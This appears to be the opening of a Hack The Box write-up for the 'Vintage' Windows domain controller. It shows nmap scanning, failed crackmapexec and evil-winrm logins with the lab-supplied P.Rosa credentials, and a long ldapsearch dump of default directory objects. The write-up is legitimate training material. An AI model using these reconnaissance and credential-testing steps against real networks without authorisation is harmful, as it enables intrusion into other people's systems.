![image](https://github.com/user-attachments/assets/8c941618-e932-40c8-9a6d-ebe580342013)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 16:29 +08
Nmap scan report for 10.10.11.45
Host is up (0.0056s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-29 08:15:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -14m58s
| smb2-time:
|   date: 2024-12-29T08:15:18
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT     ADDRESS
1   5.78 ms 10.10.14.1
2   6.18 ms 10.10.11.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.98 seconds
```

The target machine appears to be a domain controller, let's add the hosts records to Kali:

```sh
cat << EOF >> /etc/hosts
10.10.11.45 vintage.htb
10.10.11.45 dc01.vintage.htb
EOF
```

## 2. Exploring Active Directory

> **Machine information given:**
>
> As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account:
>
> `P.Rosa` / `Rosaisbest123`

### 2.1. Initial  unsuccessful enumeration

```console
root@kali:~# crackmapexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -d vintage.htb
SMB         dc01.vintage.htb 445    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01.vintage.htb [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

root@kali:~# evil-winrm -u P.Rosa -p Rosaisbest123 -i dc01.vintage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type ArgumentError happened, message is unknown type: 2061232681

Error: Exiting with code 1
```

### 2.2. Crawling ldap

```console
root@kali:~# ldapsearch -b 'DC=vintage,DC=htb' -H ldap://10.10.11.45 -D 'CN=P.Rosa,CN=Users,DC=vintage,DC=htb' -W
Enter LDAP Password:
```

<details><summary>LDAP search results</summary>

```
# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# vintage.htb
dn: DC=vintage,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=vintage,DC=htb
instanceType: 5
whenCreated: 20240605102652.0Z
whenChanged: 20241228160654.0Z
subRefs: DC=ForestDnsZones,DC=vintage,DC=htb
subRefs: DC=DomainDnsZones,DC=vintage,DC=htb
subRefs: CN=Configuration,DC=vintage,DC=htb
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAA6FVGDkxjzk21oLNTUmYhYQ==
uSNChanged: 114724
name: vintage
objectGUID:: 3PIIlH64jUKmhdyZEuPDLg==
replUpToDateVector:: AgAAAAAAAAAIAAAAAAAAAOhVRg5MY85NtaCzU1JmIWEPEAEAAAAAADq8K
 R0DAAAAnbCxNNb0vE63Ui/0KwtjbRJAAQAAAAAA9ZxGHQMAAADCcDtC1mz4TrAqq2Z0FAO7FoABAA
 AAAAA/y0YdAwAAAAZzAIqWy11MjGMk+y8b1JcQIAEAAAAAALfpOx0DAAAA01JYixtlGUWBVovII7p
 DGxigAQAAAAAAvgBVHQMAAADjqYHMhe7QSYdN7SiQ+H6vGsABAAAAAAAds4AdAwAAAGW3Ls4HJMxI
 sJksJTDs5jUZsAEAAAAAAFVEVh0DAAAA4kqu8uAF80iZNBRCoIfCsBEwAQAAAAAAJ0VFHQMAAAA=
creationTime: 133798756148336106
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAAoYXe77IkM3mNjoR6
serverState: 1
uASCompat: 0
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=vintage,DC=htb
fSMORoleOwner: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=vintage,DC=htb
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=vint
 age,DC=htb
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=vintage,DC=htb
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=vin
 tage,DC=htb
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=vintage,DC=htb
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 vintage,DC=htb
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=v
 intage,DC=htb
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=vin
 tage,DC=htb
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=vintage,D
 C=htb
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=vintage,DC=htb
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=vintag
 e,DC=htb
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=vintage,DC
 =htb
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=vintage,DC=htb;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=vintag
 e,DC=htb
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=vintage,DC=htb
masteredBy: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=
 Sites,CN=Configuration,DC=vintage,DC=htb
ms-DS-MachineAccountQuota: 0
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=vintage,DC=htb
msDS-IsDomainFor: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=vintage,DC=htb
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: vintage

# Users, vintage.htb
dn: CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Users
description: Default container for upgraded user accounts
distinguishedName: CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5660
uSNChanged: 5660
showInAdvancedViewOnly: FALSE
name: Users
objectGUID:: GqY42BYh+06ipaKGHLCNHQ==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Computers, vintage.htb
dn: CN=Computers,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Computers
description: Default container for upgraded computer accounts
distinguishedName: CN=Computers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5661
uSNChanged: 5661
showInAdvancedViewOnly: FALSE
name: Computers
objectGUID:: mOE/EJdUm0uwOYAucUHB8w==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Domain Controllers, vintage.htb
dn: OU=Domain Controllers,DC=vintage,DC=htb
objectClass: top
objectClass: organizationalUnit
ou: Domain Controllers
description: Default container for domain controllers
distinguishedName: OU=Domain Controllers,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240607223855.0Z
uSNCreated: 5804
uSNChanged: 61573
showInAdvancedViewOnly: FALSE
name: Domain Controllers
objectGUID:: NMIYX4oKMkqaAs7KoyMTvA==
systemFlags: -1946157056
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=vintage,D
 C=htb
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Syste
 m,DC=vintage,DC=htb;0]
dSCorePropagationData: 20240607223855.0Z
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101181216.0Z

# System, vintage.htb
dn: CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: System
description: Builtin system settings
distinguishedName: CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5662
uSNChanged: 5662
showInAdvancedViewOnly: TRUE
name: System
objectGUID:: t9qIqvBRbk6zb8KjFkeY9Q==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# LostAndFound, vintage.htb
dn: CN=LostAndFound,DC=vintage,DC=htb
objectClass: top
objectClass: lostAndFound
cn: LostAndFound
description: Default container for orphaned objects
distinguishedName: CN=LostAndFound,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5658
uSNChanged: 5658
showInAdvancedViewOnly: TRUE
name: LostAndFound
objectGUID:: rCDmJWHy+k+g7jAp8a2iuQ==
systemFlags: -1946157056
objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Infrastructure, vintage.htb
dn: CN=Infrastructure,DC=vintage,DC=htb
objectClass: top
objectClass: infrastructureUpdate
cn: Infrastructure
distinguishedName: CN=Infrastructure,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5805
uSNChanged: 5805
showInAdvancedViewOnly: TRUE
name: Infrastructure
objectGUID:: 50N+tu899kSvh4L7/PWrxQ==
fSMORoleOwner: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=vintage,DC=htb
systemFlags: -1946157056
objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=vintage
 ,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# ForeignSecurityPrincipals, vintage.htb
dn: CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ForeignSecurityPrincipals
description: Default container for security identifiers (SIDs) associated with
  objects from external, trusted domains
distinguishedName: CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5806
uSNChanged: 5806
showInAdvancedViewOnly: FALSE
name: ForeignSecurityPrincipals
objectGUID:: 8242eA+n9k2er6XLc89/bg==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Program Data, vintage.htb
dn: CN=Program Data,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Program Data
description: Default location for storage of application data.
distinguishedName: CN=Program Data,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5807
uSNChanged: 5807
showInAdvancedViewOnly: TRUE
name: Program Data
objectGUID:: 5EWEE4Zf9kyCNi32SAH7bQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Microsoft, Program Data, vintage.htb
dn: CN=Microsoft,CN=Program Data,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Microsoft
description: Default location for storage of Microsoft application data.
distinguishedName: CN=Microsoft,CN=Program Data,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5808
uSNChanged: 5808
showInAdvancedViewOnly: TRUE
name: Microsoft
objectGUID:: mVCEPzmnmUqZxiFio3ZIOw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# NTDS Quotas, vintage.htb
dn: CN=NTDS Quotas,DC=vintage,DC=htb

# Managed Service Accounts, vintage.htb
dn: CN=Managed Service Accounts,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Managed Service Accounts
description: Default container for managed service accounts
distinguishedName: CN=Managed Service Accounts,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5810
uSNChanged: 5810
showInAdvancedViewOnly: FALSE
name: Managed Service Accounts
objectGUID:: X731PuGUlk6+8ej+XyKOUg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Keys, vintage.htb
dn: CN=Keys,DC=vintage,DC=htb

# WinsockServices, System, vintage.htb
dn: CN=WinsockServices,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: WinsockServices
distinguishedName: CN=WinsockServices,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5663
uSNChanged: 5663
showInAdvancedViewOnly: TRUE
name: WinsockServices
objectGUID:: 3E53r79BZU66TShDChbTWw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# RpcServices, System, vintage.htb
dn: CN=RpcServices,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
objectClass: rpcContainer
cn: RpcServices
distinguishedName: CN=RpcServices,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5664
uSNChanged: 5664
showInAdvancedViewOnly: TRUE
name: RpcServices
objectGUID:: gLtHtIFCPk6tx3sau9pDvA==
systemFlags: -1946157056
objectCategory: CN=Rpc-Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# FileLinks, System, vintage.htb
dn: CN=FileLinks,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: fileLinkTracking
cn: FileLinks
distinguishedName: CN=FileLinks,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5665
uSNChanged: 5665
showInAdvancedViewOnly: TRUE
name: FileLinks
objectGUID:: dBtis+G4xkuJ4xdqC/Rf4Q==
systemFlags: -1946157056
objectCategory: CN=File-Link-Tracking,CN=Schema,CN=Configuration,DC=vintage,DC
 =htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# VolumeTable, FileLinks, System, vintage.htb
dn: CN=VolumeTable,CN=FileLinks,CN=System,DC=vintage,DC=htb

# ObjectMoveTable, FileLinks, System, vintage.htb
dn: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: fileLinkTracking
objectClass: linkTrackObjectMoveTable
cn: ObjectMoveTable
distinguishedName: CN=ObjectMoveTable,CN=FileLinks,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5667
uSNChanged: 5667
showInAdvancedViewOnly: TRUE
name: ObjectMoveTable
objectGUID:: wYHSOhHm1Uabp51MIlJ60g==
systemFlags: -1946157056
objectCategory: CN=Link-Track-Object-Move-Table,CN=Schema,CN=Configuration,DC=
 vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Default Domain Policy, System, vintage.htb
dn: CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: leaf
objectClass: domainPolicy
cn: Default Domain Policy
distinguishedName: CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5668
uSNChanged: 5668
showInAdvancedViewOnly: TRUE
name: Default Domain Policy
objectGUID:: IryNqkQUzE662gtWz6/RIA==
objectCategory: CN=Domain-Policy,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# AppCategories, Default Domain Policy, System, vintage.htb
dn: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: classStore
cn: AppCategories
distinguishedName: CN=AppCategories,CN=Default Domain Policy,CN=System,DC=vint
 age,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5669
uSNChanged: 5669
showInAdvancedViewOnly: TRUE
name: AppCategories
objectGUID:: 7I1GNevh/0CVsA3m/CmUSA==
objectCategory: CN=Class-Store,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Meetings, System, vintage.htb
dn: CN=Meetings,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Meetings
distinguishedName: CN=Meetings,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5670
uSNChanged: 5670
showInAdvancedViewOnly: TRUE
name: Meetings
objectGUID:: GrkMscImDkeMgzP5lq87fg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Policies, System, vintage.htb
dn: CN=Policies,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Policies
distinguishedName: CN=Policies,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5671
uSNChanged: 5671
showInAdvancedViewOnly: TRUE
name: Policies
objectGUID:: XR9Az4t+KU2KgjVjNFhliA==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, vintage.htb
dn: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vintage
 ,DC=htb
objectClass: top
objectClass: container
objectClass: groupPolicyContainer
cn: {31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedName: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Sy
 stem,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605103325.0Z
displayName: Default Domain Policy
uSNCreated: 5672
uSNChanged: 12595
showInAdvancedViewOnly: TRUE
name: {31B2F340-016D-11D2-945F-00C04FB984F9}
objectGUID:: 39kUdb8ve0S0yY7HZmr0LA==
flags: 0
versionNumber: 3
systemFlags: -1946157056
objectCategory: CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vintag
 e,DC=htb
isCriticalSystemObject: TRUE
gPCFunctionalityVersion: 2
gPCFileSysPath: \\vintage.htb\sysvol\vintage.htb\Policies\{31B2F340-016D-11D2-
 945F-00C04FB984F9}
gPCMachineExtensionNames: [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-248
 8-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4
 FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2
 488-11D1-A28C-00C04FB94F17}]
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000000.0Z

# User, {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, vintage.htb
dn: CN=User,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC
 =vintage,DC=htb
objectClass: top
objectClass: container
cn: User
distinguishedName: CN=User,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Polici
 es,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5673
uSNChanged: 5673
showInAdvancedViewOnly: TRUE
name: User
objectGUID:: S3xfDVmZTUGxJuWvPn0vKg==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# Machine, {31B2F340-016D-11D2-945F-00C04FB984F9}, Policies, System, vintage.ht
 b
dn: CN=Machine,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System
 ,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Machine
distinguishedName: CN=Machine,CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Pol
 icies,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5674
uSNChanged: 5674
showInAdvancedViewOnly: TRUE
name: Machine
objectGUID:: 7bDIrrMzpk67/EEESeu0qQ==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, vintage.htb
dn: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vintage
 ,DC=htb
objectClass: top
objectClass: container
objectClass: groupPolicyContainer
cn: {6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedName: CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Sy
 stem,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240607140427.0Z
displayName: Default Domain Controllers Policy
uSNCreated: 5675
uSNChanged: 53308
showInAdvancedViewOnly: TRUE
name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
objectGUID:: R/Y+t2fyDEWOwWFCsBkJpQ==
flags: 0
versionNumber: 3
systemFlags: -1946157056
objectCategory: CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vintag
 e,DC=htb
isCriticalSystemObject: TRUE
gPCFunctionalityVersion: 2
gPCFileSysPath: \\vintage.htb\sysvol\vintage.htb\Policies\{6AC1786C-016F-11D2-
 945F-00C04fB984F9}
gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4F
 B-11D0-A0D0-00A0C90F574B}]
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000000.0Z

# User, {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, vintage.htb
dn: CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC
 =vintage,DC=htb
objectClass: top
objectClass: container
cn: User
distinguishedName: CN=User,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Polici
 es,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5676
uSNChanged: 5676
showInAdvancedViewOnly: TRUE
name: User
objectGUID:: yoZbKyDYpU6L9tlWEvS2vg==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# Machine, {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, vintage.ht
 b
dn: CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System
 ,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Machine
distinguishedName: CN=Machine,CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Pol
 icies,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5677
uSNChanged: 5677
showInAdvancedViewOnly: TRUE
name: Machine
objectGUID:: 3CA88S3aBEuMzLW/yYn4vg==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# RAS and IAS Servers Access Check, System, vintage.htb
dn: CN=RAS and IAS Servers Access Check,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: RAS and IAS Servers Access Check
distinguishedName: CN=RAS and IAS Servers Access Check,CN=System,DC=vintage,DC
 =htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5678
uSNChanged: 5678
showInAdvancedViewOnly: TRUE
name: RAS and IAS Servers Access Check
objectGUID:: yyev8d5a/kuyM4ukNJMQ/w==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# File Replication Service, System, vintage.htb
dn: CN=File Replication Service,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: applicationSettings
objectClass: nTFRSSettings
cn: File Replication Service
distinguishedName: CN=File Replication Service,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5679
uSNChanged: 5679
showInAdvancedViewOnly: TRUE
name: File Replication Service
objectGUID:: uPWf7gWJiUyQkxerdQa7wQ==
systemFlags: -1946157056
objectCategory: CN=NTFRS-Settings,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Dfs-Configuration, System, vintage.htb
dn: CN=Dfs-Configuration,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: dfsConfiguration
cn: Dfs-Configuration
distinguishedName: CN=Dfs-Configuration,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5680
uSNChanged: 5680
showInAdvancedViewOnly: FALSE
name: Dfs-Configuration
objectGUID:: 4do7D+0FCk6gcwU4VNuztA==
objectCategory: CN=Dfs-Configuration,CN=Schema,CN=Configuration,DC=vintage,DC=
 htb
